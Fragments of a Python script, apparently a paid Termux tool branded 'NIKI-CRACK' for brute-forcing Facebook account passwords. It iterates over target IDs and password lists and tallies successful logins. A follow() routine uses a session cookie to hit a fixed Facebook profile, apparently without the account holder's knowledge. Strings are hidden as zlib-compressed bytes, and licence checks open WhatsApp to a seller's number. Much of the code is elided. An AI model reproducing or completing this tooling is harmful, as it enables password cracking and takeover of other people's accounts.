...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;92m[NIKI-CRACK] {loop}/{len(self.id)} [OK:-{len(ok)}]")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
    ...
    def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100002461496754', cookies={'cookie': coki}).text, 'html.parser')
...
def bnsbuy():
    ...
    try:
        ...
        bnsreg()
    try:
        bt = (b'x\x9c\xcb())(\xb6\xd2\xd7/H,.IM\xca\xcc\xd3K\xce\xcf\xd5\x0fHt\xf3.*\xf1\xcb\x04\x00\xa1\xa7\n\x9d')
    ...
    if to in r:
        ...
        os.system('am start https://wa.me/+8801645137393?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20Niki%20Paid%20Tools%20New.%20My%20Key:%20' + to) 
        bnsbuy()
...
def bnsreg():
    ...
    print 
    input('\n\x1b[1;91m [\x1b[1;92m✓\x1b[1;91m]\x1b[1;92m Press Enter To Buy This Tools')
    os.system('am start https://wa.me/+8801645137393?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20Niki%20Paid%20clonnig%20Tools%20New.%20My%20Key:%20' + id)
    f = (b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfa\xa9%\xc9\xfa\x10\xc1\x9c\xcc\xa4b\x00\x8e\xb8\x11\x88')
    bd = (zlib.decompress(f))
    sav = open(bd, 'w') 
    sav.write(id)
